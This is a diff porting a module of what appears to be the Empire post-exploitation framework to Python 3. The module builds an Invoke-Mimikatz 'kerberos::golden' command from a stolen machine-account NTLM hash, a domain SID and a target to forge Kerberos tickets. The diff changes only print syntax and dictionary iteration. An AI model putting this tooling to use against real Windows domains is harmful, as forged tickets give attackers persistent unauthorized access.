@@ -1,6 +1,9 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 from lib.common import helpers
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -108,7 +111,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -121,13 +124,13 @@ class Module:
         if credID != "":
             
             if not self.mainMenu.credentials.is_credential_valid(credID):
-                print helpers.color("[!] CredID is invalid!")
+                print(helpers.color("[!] CredID is invalid!"))
                 return ""
 
             (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
            
             if not userName.endswith("$"):
-                print helpers.color("[!] please specify a machine account credential")
+                print(helpers.color("[!] please specify a machine account credential"))
                 return ""
             if domainName != "":
                 self.options["domain"]['Value'] = domainName
@@ -141,21 +144,21 @@ class Module:
 
         # error checking
         if not helpers.validate_ntlm(self.options["rc4"]['Value']):
-            print helpers.color("[!] rc4/NTLM hash not specified")
+            print(helpers.color("[!] rc4/NTLM hash not specified"))
             return ""
 
         if self.options["target"]['Value'] == "":
-            print helpers.color("[!] target not specified")
+            print(helpers.color("[!] target not specified"))
             return ""
 
         if self.options["sid"]['Value'] == "":
-            print helpers.color("[!] domain SID not specified")
+            print(helpers.color("[!] domain SID not specified"))
             return ""
 
         # build the golden ticket command        
         scriptEnd = "Invoke-Mimikatz -Command '\"kerberos::golden"
 
-        for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if option.lower() != "agent" and option.lower() != "credid":
                 if values['Value'] and values['Value'] != '':
                     scriptEnd += " /" + str(option) + ":" + str(values['Value']) 
